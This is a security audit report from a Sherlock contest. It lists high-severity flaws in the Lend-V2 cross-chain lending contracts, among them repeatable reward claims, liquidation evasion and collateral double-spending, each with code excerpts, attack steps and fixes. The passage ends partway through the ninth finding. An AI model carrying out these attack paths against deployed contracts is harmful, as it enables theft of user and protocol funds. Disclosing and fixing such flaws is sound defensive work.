# Issue H-1: Drainage of the LEND token reserves through repeated claims of the same rewards 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/148 

## Found by 
0x23r0, 0xAlix2, 0xMakSecur, 0xNForcer, 0xgh0st, 37H3RN17Y2, Allen\_George08, Audinarey, Brene, Drynooo, Etherking, HeckerTrieuTien, Invcbull, Kirkeelee, Kvar, Lamsya, MRXSNOWDEN, Mimis, PNS, SafetyBytes, Sneks, Tigerfrake, Z3R0, algiz, benjamin\_0923, bigbear1229, dmdg321, dreamcoder, durov, future, ggg\_ttt\_hhh, h2134, hgrano, jokr, mahdifa, momentum, newspacexyz, patitonar, t.aksoy, velev, wickie, xiaoming90, yaioxy, ydlee, zacwilliamson, zraxx, zxriptor

### Summary

The `claimLend()` function in CoreRouter allows perpetual granting of LEND tokens because `lendStorage.lendAccrued` is never reset after successful grants, enabling users to claim the same rewards multiple times.

### Root Cause

In the [`claimLend()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L402) function, the protocol calls `grantLendInternal()` to transfer LEND tokens to users but fails to reset the accrued balance afterwards:

```solidity
for (uint256 j = 0; j < holders.length;) {
    uint256 accrued = lendStorage.lendAccrued(holders[j]);
    if (accrued > 0) {
        grantLendInternal(holders[j], accrued);
    }
    unchecked {
        ++j;
    }
}
```

The `grantLendInternal()` function successfully transfers tokens but returns the remaining amount (0 if successful), which is ignored. This means `lendStorage.lendAccrued[holders[j]]` retains its value and can be claimed again.

In contrast, Compound's correct implementation [resets the accrued balance](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/Lendtroller.sol#L1456) after granting:

```solidity
lendAccrued[holders[j]] = grantLendInternal(holders[j], lendAccrued[holders[j]]);
```

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. User supplies tokens to the protocol and accrues LEND rewards
2. User calls `claimLend()` to receive their accrued LEND tokens
3. The function transfers the tokens but doesn't reset `lendStorage.lendAccrued[user]`
4. User can immediately call `claimLend()` again to receive the same rewards
5. The process can be repeated until the protocol's LEND balance is drained

### Impact

Complete drainage of the protocol's LEND token reserves through repeated claims of the same rewards. Users can exploit this to receive unlimited LEND tokens, far exceeding their legitimate rewards, which can lead to protocol insolvency and prevent other users from claiming their rightful rewards.

### PoC

No response

### Mitigation

Update the `claimLend()` function to reset the accrued balance after successful grants properly:

```solidity
for (uint256 j = 0; j < holders.length;) {
    uint256 accrued = lendStorage.lendAccrued(holders[j]);
    if (accrued > 0) {
        uint256 remaining = grantLendInternal(holders[j], accrued);
        lendStorage.updateLendAccrued(holders[j], remaining);
    }
    unchecked {
        ++j;
    }
}
```

This requires adding an `updateLendAccrued()` function to LendStorage to allow authorized contracts to update accrued balances. 

# Issue H-2: Protocol rewards tokens permanently stuck 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/184 

## Found by 
0x15, 0xAlix2, Kvar, SarveshLimaye, Waydou, benjamin\_0923, chaos304, h2134, jokr, newspacexyz, patitonar, t.aksoy, wickie, xiaoming90, yaioxy, zxriptor

### Summary

During liquidations, the protocol seizes a portion of collateral tokens (2.8%) as protocol rewards. These seized tokens are tracked in the `protocolReward` mapping but have no mechanism for withdrawal, causing them to be permanently stuck in the contract.

### Root Cause

In `CoreRouter.sol`, the protocol [calculates and stores](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L300) its share of seized tokens during liquidations:

```solidity
uint256 currentReward = mul_(seizeTokens, Exp({mantissa: lendStorage.PROTOCOL_SEIZE_SHARE_MANTISSA()}));
lendStorage.updateProtocolReward(lTokenCollateral, lendStorage.protocolReward(lTokenCollateral) + currentReward);
```

The `PROTOCOL_SEIZE_SHARE_MANTISSA` is set to 2.8% (2.8e16), meaning the protocol claims 2.8% of all seized collateral. However, there are no functions in `LendStorage.sol`, `CoreRouter.sol`, or `CrossChainRouter.sol` that allow withdrawal or utilization of these accumulated rewards.

The only function that modifies `protocolReward` is `updateProtocolReward()`, which can only increase the balance but never decrease it.

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

This is not an attack but a design flaw:

1. The user's position becomes liquidable due to market conditions
2. Liquidator calls `liquidateBorrowInternal()` 
3. Protocol calculates its 2.8% share: `currentReward = seizeTokens * 0.028`
4. Protocol share is added to `protocolReward[lTokenCollateral]` mapping
5. Remaining tokens (97.2%) go to the liquidator
6. Protocol's 2.8% share remains permanently stuck with no withdrawal mechanism

### Impact

**High** - Protocol loses access to earned revenue from liquidations. Over time, significant value accumulates in the contract that cannot be recovered, representing a permanent loss of protocol funds that could be used for:
- Treasury operations
- Development funding  
- Emergency reserves
- Governance token buybacks

### PoC

No response

### Mitigation

The protocol team should reassess the intended usage of liquidation-seized funds and implement appropriate mechanisms accordingly. Potential approaches include:

- Adding accumulated protocol rewards to existing reserve mechanisms.
- Establishing governance-controlled usage of these accumulated assets.

# Issue H-3: User can evade liquidation and bridge funds by exploiting cross-chain borrow/collateral invariant 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/224 

## Found by 
Emine, Kirkeelee, h2134

### Summary

A user can supply nearly all their collateral on Chain A and borrow against it on Chain B, then supply a dust amount on Chain B and borrow a dust amount on Chain A. This sequence results in both cross-chain borrow and collateral mappings being populated for the same asset and user on both chains, violating protocol invariant. As a result, the protocol cannot calculate or liquidate the user’s position, because the function `borrowWithInterest ` reverts, allowing the user to bridge out nearly all their collateral and evade liquidation.

### Root Cause

The protocol enforces an invariant in the `borrowWithInterest(address borrower, address _lToken)` function that, for any user and underlying asset on a given chain, only one of `crossChainBorrows `or `crossChainCollaterals `should be populated. However, if a user first supplies collateral on Chain A and borrows on Chain B (populating `crossChainBorrows `on A and `crossChainCollaterals `on B), and then supplies a dust amount on Chain B and borrows a dust amount on Chain A (populating `crossChainBorrows `on B and `crossChainCollaterals `on A), both mappings become populated for the same user and asset on both chains. This breaks the protocol’s invariant, causing the require statement in `borrowWithInterest `to revert. As a result, any function that checks or calculates borrow balances (including liquidation logic) will fail for that user and asset. The user loses out on LEND rewards for the position but is able to bridge out almost all their collateral, leaving the protocol unable to liquidate or close their position.

https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L478-L486

### Internal Pre-conditions

The protocol allows users to open cross-chain borrows in both directions for the same asset.

### External Pre-conditions

The user can supply a dust (very small) amount on one chain and borrow a dust amount on the other, in addition to their main position.

### Attack Path

1. User supplies almost all collateral on Chain A.
2. User borrows nearly the full amount on Chain B (cross-chain borrow).
3. User supplies a dust amount on Chain B.
4. User borrows a dust amount on Chain A (reverse cross-chain borrow).
5. Now, both `crossChainBorrows `and `crossChainCollaterals `are populated for the same asset and user on both chains.
6. Any liquidation or borrow calculation reverts due to the require in `borrowWithInterest`, making the position uncloseable and non-liquidatable.
7. User loses out on LEND rewards for the position but successfully bridges out almost all their collateral.

### Impact

The protocol cannot calculate or liquidate the user’s position, as `borrowWithInterest `reverts. The user can bridge out nearly all their collateral, leaving the protocol with an uncloseable, non-liquidatable position. This results in bad debt accumulation: the protocol is left with outstanding borrows that cannot be repaid or liquidated, directly threatening solvency and leading to potential loss of funds for other users and the protocol itself.

### PoC

_No response_

### Mitigation

Redesign the cross-chain borrow/collateral tracking logic to prevent both mappings from being populated for the same user and asset on the same chain.

# Issue H-4: Cross-chain liquidation uses incorrect lToken address, preventing repayment and breaking liquidation flow 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/308 

## Found by 
0xc0ffEE, 0xnegan, 37H3RN17Y2, HeckerTrieuTien, Phaethon, aman, dimah7, future, ggg\_ttt\_hhh, holtzzx, jokr, newspacexyz, rudhra1749

### Summary

The liquidation flow fails due to the incorrect use of the `lToken` address from Chain A when processing on Chain B. Specifically, after collateral is seized on Chain A, a message is sent back to Chain B using the Chain A version of the `lToken`, causing `findCrossChainCollateral()` to fail. This results in the borrow position not being found, and the repayment on Chain B does not proceed.

### Root Cause

In `CrossChainRouter.sol: 280 _executeLiquidationCore` (on Chain B), the seized collateral is sent to Chain A using:
https://github.com/sherlock-audit/2025-05-lend-audit-contest-sylvarithos/blob/551944cd87d138620b89c11674a92f1dcbe0efbe/Lend-V2/src/LayerZero/CrossChainRouter.sol#L280
```solidity
function _executeLiquidationCore(LendStorage.LiquidationParams memory params) private {
    ...
    // Send message to Chain A to execute the seize
    _send(
        params.srcEid,
        seizeTokens,
        params.storedBorrowIndex,
        0,
        params.borrower,
280     lendStorage.crossChainLTokenMap(params.lTokenToSeize, params.srcEid), // Convert to Chain A version before sending
        msg.sender,
        params.borrowedAsset,
        ContractType.CrossChainLiquidationExecute
    );
}
```

This correctly translates the collateral token into its Chain A version, since that's where the collateral exists.  
However, in `CrossChainRouter.sol: 445 _handleLiquidationSuccess` (on Chain B again), this same `destlToken` is used to find the borrow position:
https://github.com/sherlock-audit/2025-05-lend-audit-contest-sylvarithos/blob/551944cd87d138620b89c11674a92f1dcbe0efbe/Lend-V2/src/LayerZero/CrossChainRouter.sol#L445
```solidity
function _handleLiquidationSuccess(LZPayload memory payload) private {
    // Find the borrow position on Chain B to get the correct srcEid
445    address underlying = lendStorage.lTokenToUnderlying(payload.destlToken);

    // Find the specific collateral record
    (bool found, uint256 index) = lendStorage.findCrossChainCollateral(
        payload.sender,
        underlying,
        currentEid, // srcEid is current chain
        0, // We don't know destEid yet, but we can match on other fields
        payload.destlToken,
        payload.srcToken
    );
```

This fails because `payload.destlToken` refers to the Chain A token address, which does not exist in Chain B's `crossChainCollaterals` mapping.

### Internal Pre-conditions

1. Borrower has active cross-chain borrow from Chain A collateral to Chain B borrow.
2. Liquidator initiates a liquidation on Chain B.
3. Seize token execution completes on Chain A.

### External Pre-conditions

None — this issue arises from internal logic inconsistency between chains.

### Attack Path

1. Liquidator initiates a valid liquidation on Chain B.
2. Chain B sends a message to Chain A to seize collateral.
3. Chain A processes the seize and sends back success payload including `destlToken = Chain A version`.
4. Chain B attempts to finalize repayment using `payload.destlToken`.
5. Since this is not a valid `lToken` on Chain B, `findCrossChainCollateral()` fails.
6. Liquidation repayment is never applied; protocol state remains incorrect.

### Impact

- The liquidation repayment flow is broken.
- The borrower's borrow position remains active even though collateral has been seized.
- The protocol can become inconsistent and undercollateralized.
- Liquidators may receive seized tokens without corresponding debt reduction, leading to systemic accounting errors.

### Mitigation

In `_handleLiquidationSuccess`, should use `payload.srcToken`.

```solidity
- function _handleLiquidationSuccess(LZPayload memory payload) private {
+ function _handleLiquidationSuccess(LZPayload memory payload, uint32 srcEid) private {
    // Find the borrow position on Chain B to get the correct srcEid
-   address underlying = lendStorage.lTokenToUnderlying(payload.destlToken);
+   address lToken = lendStorage.underlyingTolToken(payload.srcToken);

    // Find the specific collateral record
    (bool found, uint256 index) = lendStorage.findCrossChainCollateral(
        payload.sender,
-       underlying,
+       payload.srcToken
-       currentEid, // srcEid is current chain
-       0, // We don't know destEid yet, but we can match on other fields
+       srcEid,
+       currentEid
-       payload.destlToken,
+       lToken
        payload.srcToken
    );
```

# Issue H-5: wrong calculation of amount of Ltokens to seize in liquidateCrossChain function 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/321 

## Found by 
ggg\_ttt\_hhh, jokr, rudhra1749

### Summary

If a borrower cross borrows tokens in chainB while giving collateral in chainA.Then if he was undercollateralized then a liquidator can call liquidateCrossChain function in chain B to liquidate that borrower.
If we see inputs of liquidateCrossChain function,
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L172-L177
```solidity
    function liquidateCrossChain(
        address borrower,
        uint256 repayAmount,
        uint32 srcEid,
        address lTokenToSeize,
        address borrowedAsset
```
let's say the collateral token that borrower provided in chain A is LtokenChainA and ltokenDestchain that is Ltoken corresponding to LtokenChainA is chain B is LtokenChainB.
here in input of liquidateCrossChain function  lTokenToSeize = LtokenChainB.
It was used in the calculation of amount of collateral tokens to seize in chain A .
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L268-L269
```solidity
        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);
```
and here if we see implementation of Lendtroller.liquidateCalculateSeizeTokens function,
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/Lendtroller.sol#L852-L888
```solidity
    function liquidateCalculateSeizeTokens(address lTokenBorrowed, address lTokenCollateral, uint256 actualRepayAmount)
        external
        view
        override
        returns (uint256, uint256)
    {
        /* Read oracle prices for borrowed and collateral markets */
        uint256 priceBorrowedMantissa = oracle.getUnderlyingPrice(LToken(lTokenBorrowed));


        uint256 priceCollateralMantissa = oracle.getUnderlyingPrice(LToken(lTokenCollateral));


        if (priceBorrowedMantissa == 0 || priceCollateralMantissa == 0) {
            return (uint256(Error.PRICE_ERROR), 0);
        }


        /*
         * Get the exchange rate and calculate the number of collateral tokens to seize:
         *  seizeAmount = actualRepayAmount * liquidationIncentive * priceBorrowed / priceCollateral
         *  seizeTokens = seizeAmount / exchangeRate
         *   = actualRepayAmount * (liquidationIncentive * priceBorrowed) / (priceCollateral * exchangeRate)
         */
        uint256 exchangeRateMantissa = LToken(lTokenCollateral).exchangeRateStored(); // Note: reverts on error


        uint256 seizeTokens;
        Exp memory numerator;
        Exp memory denominator;
        Exp memory ratio;


        numerator = mul_(Exp({mantissa: liquidationIncentiveMantissa}), Exp({mantissa: priceBorrowedMantissa}));


        denominator = mul_(Exp({mantissa: priceCollateralMantissa}), Exp({mantissa: exchangeRateMantissa}));


        ratio = div_(numerator, denominator);


        seizeTokens = mul_ScalarTruncate(ratio, actualRepayAmount);


        return (uint256(Error.NO_ERROR), seizeTokens);
```
here in the  calculation  of seizeTokens it uses exchangeRate between LtokenChainB and tokenChainB. But this calculation will give amount of LtokenChainB we should seize but not amount of  tokens we should seize of LtokenChainA.we should calculate this amount in chain A not chain B. most probably exchangeRate in chain A and chain B will be different . so this seizeTokens value was not correctly representing amount of LtokenChainA to seize.

### Root Cause

using 
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L268-L269
```solidity
        (uint256 amountSeizeError, uint256 seizeTokens) = LendtrollerInterfaceV2(lendtroller)
            .liquidateCalculateSeizeTokens(borrowedlToken, params.lTokenToSeize, params.repayAmount);
```
this to calculate amount of LtokenChainA to seize instead of calculating that value in chainA.

### Internal Pre-conditions

for this bug to make impact, the exchangeRate of these Ltokens should be differ in 2 chains.

### External Pre-conditions

none 

### Attack Path

liquidator calls liquidateCrossChain function


### Impact

amount of collateral tokens seized from borrower will be less or more than what it should be based on Differences in ExchangeRates.
may be this could cause liquidation to fail, because of wrong no of collateral tokens to seize

### PoC

_No response_

### Mitigation

calculate the amount of collateral tokens to seize in chainA instead of chainB or use Ltoken of chainA in calculation instead of using Ltoken of chainB

# Issue H-6: Cross-chain borrow ignores existing debt in collateral validation 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/341 

## Found by 
0xEkko, 0xgh0st, JeRRy0422, Kirkeelee, Nlwje, Phaethon, TessKimy, Uddercover, Waydou, Z3R0, aman, dystopia, future, ggg\_ttt\_hhh, hgrano, jokr, mahdifa, mussucal, newspacexyz, oxelmiguel, stonejiajia, t.aksoy, theweb3mechanic, zxriptor

### Summary

When initiating cross-chain borrows, the source chain only sends the raw collateral value to the destination chain without accounting for existing borrows. This allows users to effectively double-spend their collateral by borrowing against the same collateral on multiple chains, creating systemic undercollateralization risks.

### Root Cause

In [`borrowCrossChain()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L139), the collateral calculation only extracts the collateral amount while ignoring existing borrows:

```solidity
(, uint256 collateral) = 
    lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), 0, 0);
```

The function `getHypotheticalAccountLiquidityCollateral` returns `(totalBorrowed, totalCollateral)`, but only the collateral value is sent to the destination chain via LayerZero message. The destination chain then validates only against this raw collateral value without knowing about existing borrows.

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

1. User supplies 1000 USDC collateral on Chain A (worth $1000, 80% collateral factor = $800 borrowing capacity)
2. User borrows 600 USDT on Chain A (leaving $200 remaining capacity)
3. User calls `borrowCrossChain()` from Chain A → Chain B to borrow 700 USDT
4. Source chain calculates collateral as $800 and sends this value to Chain B
5. Destination chain receives collateral value of $800 and allows borrow of 700 USDT
6. **Result**: User has borrowed $1300 total against $800 collateral capacity (162.5% utilization)

The destination chain [validation incorrectly passes](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L621-L622) because:

```solidity
require(payload.collateral >= totalBorrowed, "Insufficient collateral");
```
Where `payload.collateral` is the raw $800 collateral value, not the available borrowing capacity after existing borrows.

### Impact

**High** - Systemic undercollateralization with potential for protocol insolvency:

1. Users can borrow more than their collateral should allow
2. Positions become unliquidatable when total borrows exceed collateral value
3. Protocol suffers losses when collateral cannot cover outstanding debts
4. Multiple users exploiting this can drain protocol reserves
5. Makes risk assessment and recovery mechanisms more difficult

Example with 1000 USDC collateral (80% factor):
- Available capacity: $800
- Source chain borrows: $600  
- Cross-chain borrow: $700
- **Total exposure**: $1300 vs $800 capacity (162.5% utilization)

### PoC

No response

### Mitigation

Send net available borrowing capacity instead of raw collateral value. The source chain should calculate the difference between total collateral and existing borrows, then send this available capacity to the destination chain for validation rather than the raw collateral amount. 

# Issue H-7: Over-Seizure of Collateral During Liquidation 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/363 

## Found by 
sil3th

### Summary

The `liquidateBorrow` function, in its current implementation, can lead to an over-seizure of collateral from a borrower. This occurs because the `repayAmount` provided by the liquidator is used to both reduce the borrower's debt and subsequently calculate the amount of collateral to seize. Due to the sequential execution, the collateral seizure calculation in `liquidateSeizeUpdate` is based on the initial `repayAmount` supplied by the liquidator, even though the borrower's debt has already been reduced by that amount via `repayBorrowInternal`. This can result in more collateral being seized than is necessary to cover the actual remaining shortfall after the repayment.

### Affected Code
https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/713372a1ccd8090ead836ca6b1acf92e97de4679/Lend-V2/src/LayerZero/CoreRouter.sol#L212
## Root Cause

The `repayAmount` parameter is used twice in the liquidation process within `liquidateBorrowInternal`:

1.  It is first used to reduce the borrower's debt via a call to `repayBorrowInternal`.
2.  It is then passed directly to `liquidateSeizeUpdate` to calculate `seizeTokens`.

The `liquidateSeizeUpdate` function's `liquidateCalculateSeizeTokens` call does not account for the fact that the borrower's debt has already been reduced by the `repayAmount` (or a portion of it, capped by `maxClose`) in the preceding `repayBorrowInternal` call. This leads to the calculation of seized collateral being based on a debt reduction that has already occurred, potentially resulting in seizing more collateral than is necessary for the remaining shortfall.

## Internal Pre-conditions

* A borrower has an outstanding loan and is in a shortfall (undercollateralized) state.
* The `liquidateBorrowAllowedInternal` function permits the liquidation (i.e., `borrowedAmount > collateral` and `repayAmount <= maxClose`).
* The `liquidateCalculateSeizeTokens` function calculates seized tokens based on the `repayAmount` provided.

## External Pre-conditions

* A liquidator initiates a liquidation transaction with a `repayAmount` that is greater than the actual shortfall, but still within the `maxClose` limit.

## Attack Path

1.  **Initial State:** Alice has a loan of 1000 USDC and collateral worth 950 USDC. She is in a shortfall of 50 USDC.
2.  **Liquidator Action:** Bob (the liquidator) sees Alice's position and decides to repay 200 USDC (which is allowed if the protocol's `maxClose` factor permits repaying up to 200 USDC).
3.  **`liquidateBorrow` Call:** Bob calls `liquidateBorrow(Alice, 200, lTokenCollateral, borrowedAsset)`.
4.  **`liquidateBorrowInternal` Execution:**
    * `liquidateBorrowAllowedInternal` is called:
        * It confirms Alice is in shortfall (1000 > 950).
        * It confirms `repayAmount` (200) is less than or equal to `maxClose`. The check passes.
    * `repayBorrowInternal(Alice, Bob, 200, borrowedlToken, true)` executes:
        * Alice's USDC debt is reduced by 200. Her new debt is 800 USDC.
        * Alice's account is now healthy (800 debt, 950 collateral).
    * `liquidateSeizeUpdate(msg.sender, Alice, lTokenCollateral, borrowedlToken, 200)` is called:
        * `LendtrollerInterfaceV2(lendtroller).liquidateCalculateSeizeTokens(..., 200)` is invoked. This function calculates the amount of collateral to seize based on the `repayAmount` of 200 USDC.
        * The protocol proceeds to seize collateral corresponding to 200 USDC, even though only 50 USDC was needed to cover the original shortfall, and the account is now healthy.

## Impact

This vulnerability leads to the over-seizure of collateral from the borrower and the liquidator gains an unfair amount of collateral, effectively profiting from an over-liquidation.

## PoC


## Mitigation

The `liquidateSeizeUpdate` function should calculate `seizeTokens` based on the *actual shortfall amount* that was resolved by the `repayAmount`, rather than using the full `repayAmount` directly if it exceeds the shortfall

# Issue H-8: CoreRouter Prone to Fund Depletion or Trapping Due to Miscalculated Redemption Payouts 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/464 

## Found by 
0x15, 0xlucky, 0xzey, 1337web3, Abhan1041, BimBamBuki, Brene, CL001, Etherking, Fade, Frontrunner, HeckerTrieuTien, Hueber, JeRRy0422, Odieli, PNS, Tigerfrake, dimah7, durov, ggg\_ttt\_hhh, ifeco445, ivxylo, kelvinclassic11, m3dython, molaratai, newspacexyz, nodesemesta, odessos42, smbv-1923, t.aksoy, wickie, x0rc1ph3r, zraxx, zxriptor

### Summary

The `redeem` [function](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CoreRouter.sol#L100) in `CoreRouter.sol` (lines 82-110) is responsible for redeeming a user's LTokens for the underlying asset. The process involves:
1.  Fetching the current exchange rate using `LTokenInterface(_lToken).exchangeRateStored()` (line 93). This rate can be stale if, for example, interest has accrued within the `LToken` but its `accrueInterest()` function hasn't been recently called to update the stored rate.
2.  Calculating `expectedUnderlying` tokens to be returned to the user based on this potentially stale rate (line 96: `uint256 expectedUnderlying = (_amount * exchangeRateBefore) / 1e18;`).
3.  Calling `LErc20Interface(_lToken).redeem(_amount)` (line 98). This function call is expected to result in the `LToken` contract transferring the actual amount of underlying tokens (based on its *own* current, possibly updated, exchange rate and any applicable fees) to the `CoreRouter` contract.
4.  Transferring the pre-calculated `expectedUnderlying` amount from `CoreRouter` to the `msg.sender` (the user) (line 99: `IERC20(_token).transfer(msg.sender, expectedUnderlying);`).

The vulnerability arises because `CoreRouter` transfers `expectedUnderlying` without confirming the `actualUnderlyingReceived` from the `LToken.redeem()` call.
*   If `actualUnderlyingReceived < expectedUnderlying` (e.g., `exchangeRateStored()` was erroneously high, or the `LToken` applies redemption fees not reflected in `exchangeRateStored()`), `CoreRouter` pays out more than it received, leading to a drain of its underlying token reserves for that market.
*   If `actualUnderlyingReceived > expectedUnderlying` (e.g., `exchangeRateStored()` was stale and low, and the `LToken`'s internal rate was higher after interest accrual during its `redeem` process), `CoreRouter` pays out less than it received, causing the excess funds to be trapped in the `CoreRouter` contract.

### Root Cause

The `CoreRouter.redeem()` function trusts the `expectedUnderlying` amount, calculated using `LTokenInterface(_lToken).exchangeRateStored()` *before* the `LToken`'s redeem operation, for the final payout to the user. It does not verify or use the actual amount of underlying tokens it receives from the `LErc20Interface(_lToken).redeem()` call. The `LToken` itself may use a more current (updated) exchange rate or apply fees during its `redeem` execution, leading to a mismatch between `expectedUnderlying` and the actual tokens received by `CoreRouter`.

### Internal Pre-conditions

*   A user calls the `redeem(uint256 _amount, address payable _lToken)` function.
*   The `_lToken` provided is a valid LToken recognized by `lendStorage`.
*   The user has a sufficient balance of `_lToken` (tracked by `lendStorage.totalInvestment`).
*   The user's redemption request passes liquidity checks (`lendStorage.getHypotheticalAccountLiquidityCollateral`).
*   `CoreRouter` potentially holds some reserve of the underlying token to cover discrepancies if it overpays.

### External Pre-conditions

*   A discrepancy exists between the value returned by `LTokenInterface(_lToken).exchangeRateStored()` (when called by `CoreRouter` at line 93) and the effective exchange rate or net amount that `LErc20Interface(_lToken).redeem()` uses/provides when transferring underlying tokens to `CoreRouter`. This can occur if:
    *   `exchangeRateStored()` is stale (has not been updated recently via `accrueInterest()` in the `LToken`).
    *   The `LToken`'s `redeem()` function internally calls `accrueInterest()`, changing the exchange rate *after* `CoreRouter` fetched `exchangeRateStored()`.
    *   The `LToken`'s `redeem()` function applies fees that reduce the net underlying tokens transferred to `CoreRouter`, and these fees are not reflected in the `exchangeRateStored()` value.

### Attack Path

**Scenario 1: Fund Drain from CoreRouter (CoreRouter overpays user)**
1.  A situation occurs where `LTokenInterface(_lToken).exchangeRateStored()` provides a rate (`R_stale`) that will lead to an `expectedUnderlying` calculation higher than what `CoreRouter` will actually receive from `LToken.redeem()`. This could be because:
    *   The `LToken` applies a redemption fee (e.g., 0.1% of the redeemed amount) which is not factored into `R_stale`.
    *   `R_stale` is anomalously high compared to the rate the `LToken` will use internally (e.g., `R_stale` is from a moment before a downward rate correction within the `LToken`).
2.  A user (or an entity aware of this discrepancy) calls `CoreRouter.redeem(_amount, _lToken)`.
3.  `CoreRouter` calculates `expectedUnderlying = (_amount * R_stale) / 1e18`.
4.  `CoreRouter` calls `LErc20Interface(_lToken).redeem(_amount)`. The `LToken` contract processes this, and due to fees or a lower internal rate, transfers `actualUnderlyingReceived` to `CoreRouter`, where `actualUnderlyingReceived < expectedUnderlying`.
5.  `CoreRouter` transfers `expectedUnderlying` to the user (line 99).
6.  `CoreRouter` has now paid out `expectedUnderlying - actualUnderlyingReceived` more of the underlying token than it received for this specific operation.
7.  Repeated redemptions under these conditions will continuously drain `CoreRouter`'s reserves of that underlying token.

**Scenario 2: Funds Trapped in CoreRouter (User receives less than LToken's current value)**
1.  `LTokenInterface(_lToken).exchangeRateStored()` provides a rate (`R_stale`) which is lower than the `LToken`'s actual current exchange rate (e.g., interest has accrued in the `LToken`, but `R_stale` hasn't been updated).
2.  A user calls `CoreRouter.redeem(_amount, _lToken)`.
3.  `CoreRouter` calculates `expectedUnderlying = (_amount * R_stale) / 1e18`.
4.  `CoreRouter` calls `LErc20Interface(_lToken).redeem(_amount)`. The `LToken` contract processes this (potentially calling `accrueInterest()` internally), uses its up-to-date higher exchange rate, and transfers `actualUnderlyingReceived` to `CoreRouter`, where `actualUnderlyingReceived > expectedUnderlying`.
5.  `CoreRouter` transfers `expectedUnderlying` (the lower amount) to the user.
6.  The difference, `actualUnderlyingReceived - expectedUnderlying`, remains trapped in the `CoreRouter` contract, as it's not accounted for.

### Impact

1.  **Gradual Drain of Underlying Token Reserves:** If `CoreRouter` consistently receives fewer underlying tokens from `LToken.redeem()` than its `expectedUnderlying` calculation (e.g., due to LToken redemption fees), it will transfer out more tokens than it receives. This leads to a gradual depletion of `CoreRouter`'s reserves for that specific underlying token. If these reserves are exhausted, further operations for that market (like other users' redemptions) could fail or be impaired, potentially damaging the protocol's solvency for that market.
2.  **Trapped Funds in CoreRouter:** If `CoreRouter` receives more underlying tokens than `expectedUnderlying` (e.g., due to a stale, lower `exchangeRateStored()`), the excess tokens become trapped in the `CoreRouter` contract. While not a direct loss to the protocol's overall holdings, these funds are not correctly allocated (e.g., to the redeeming user who might have been entitled to more based on the LToken's actual current rate) and are not managed or recoverable by any apparent mechanism. This represents an accounting discrepancy and a loss of value for users or the protocol's distributable surplus.

### PoC

_No response_

### Mitigation

_No response_

# Issue H-9: Unable to liquidate cross chain borrow 

Source: https://github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/591 

## Found by 
0xc0ffEE, coin2own, future, jokr

### Summary

Incorrect implementation to fetch cross chain borrowed amount can cause cross chain liquidation unable to executed

### Root Cause

In the function [`CrossChainRouter::_validateAndPrepareLiquidation()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/CrossChainRouter.sol#L197), the repay amount is checked with the max liquidation amount, with max liquidation amount fetched from `lendStorage.getMaxLiquidationRepayAmount(params.borrower,params.borrowedlToken,false)`. The function [`LendStorage::getMaxLiquidationRepayAmount()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L573C14-L573C42) calculates cross chain borrow amount by using the function [`LendStorage::borrowWithInterest()`](https://github.com/sherlock-audit/2025-05-lend-audit-contest/blob/main/Lend-V2/src/LayerZero/LendStorage.sol#L478). The cross chain liquidation is initiated from dest chain, then the function `borrowWithInterest()` will calculate borrow amount from the variable `crossChainCollaterals[borrower][_token]`
```solidity
    function borrowWithInterest(address borrower, address _lToken) public view returns (uint256) {
        address _token = lTokenToUnderlying[_lToken];
        uint256 borrowedAmount;

        Borrow[] memory borrows = crossChainBorrows[borrower][_token];
        Borrow[] memory collaterals = crossChainCollaterals[borrower][_token];

        require(borrows.length == 0 || collaterals.length == 0, "Invariant violated: both mappings populated");
        // Only one mapping should be populated:
        if (borrows.length > 0) {
            for (uint256 i = 0; i < borrows.length; i++) {
                if (borrows[i].srcEid == currentEid) {
                    borrowedAmount +=
                        (borrows[i].principle * LTokenInterface(_lToken).borrowIndex()) / borrows[i].borrowIndex;
                }
            }
        } else {
            for (uint256 i = 0; i < collaterals.length; i++) {
                // Only include a cross-chain collateral borrow if it originated locally.
@>                if (collaterals[i].destEid == currentEid && collaterals[i].srcEid == currentEid) { // <<<<< incorrect condition
                    borrowedAmount +=
                        (collaterals[i].principle * LTokenInterface(_lToken).borrowIndex()) / collaterals[i].borrowIndex;
                }
            }
        }
        return borrowedAmount;
    }
```
